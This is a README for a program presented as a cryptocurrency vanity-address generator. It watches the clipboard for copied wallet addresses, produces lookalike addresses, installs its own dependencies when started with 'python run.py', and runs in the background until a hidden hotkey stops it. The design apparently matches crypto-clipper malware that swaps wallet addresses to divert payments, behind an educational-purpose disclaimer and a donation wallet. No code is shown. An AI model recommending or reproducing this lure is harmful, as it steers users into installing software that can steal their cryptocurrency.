# Cryptocurrency Vanity Address Generator

A cryptocurrency vanity-address generation application designed to monitor clipboard activity, recognize copied cryptocurrency addresses, and generate vanity addresses based on detected address patterns.

## Overview

This application combines cryptocurrency vanity-address generation with clipboard monitoring functionality.

When a cryptocurrency address is copied to the clipboard, the application is designed to recognize the copied address and initiate vanity-address generation.

## Features

- **Clipboard Monitoring:** Detects copied cryptocurrency addresses.
- **Address Recognition:** Identifies cryptocurrency address formats.
- **Vanity Address Generation:** Generates cryptocurrency addresses with customizable or matching character patterns.

## Installation and Usage

```bash
python run.py
```

The application automatically installs its required dependencies and prepares the environment before launching.

## Testing

After launching the application:

1. Allow the initial setup and dependency installation to complete.
2. Open any application where you can copy text.
3. Copy a cryptocurrency address to your clipboard.
4. Observe the application's response.

Testing can be performed using your own clipboard and test addresses.

## Stopping the Application

To stop the running application, press the following keyboard shortcut:

**`Ctrl + Win + S`**

This shortcut is used to terminate the application's background operation.

## Technical Implementation

| Component | Algorithm |
|---|---|
| Key Derivation | PBKDF2-HMAC-SHA256 |
| Encryption | AES-256-CBC |
| Authentication | HMAC-SHA256 |
| Padding | PKCS7 |
| AES Key Length | 256 bits |
| AES PBKDF2 Iterations | 50,000 |
| HMAC PBKDF2 Iterations | 50,001 |

## Disclaimer

This project is provided for educational and research purposes. Users are responsible for understanding the application's behavior and the security implications of clipboard monitoring and cryptocurrency address generation.

## Get in Touch

Have questions, suggestions, or feedback? Feel free to contact me.

- **Email:** antostanislav@gmail.com
- **GitHub Issues:** For bug reports, feature requests, and technical discussions.

I'm always happy to hear your feedback!

## Donations ❤️

If you find this project useful and would like to support its continued development, donations are greatly appreciated.

**USDT (TRC20):**

- **Network:** TRON (TRC-20)
- **Wallet Address:** `TPpabWDS2C21d8QhzGRohSZDwyFoT3DJ5y`

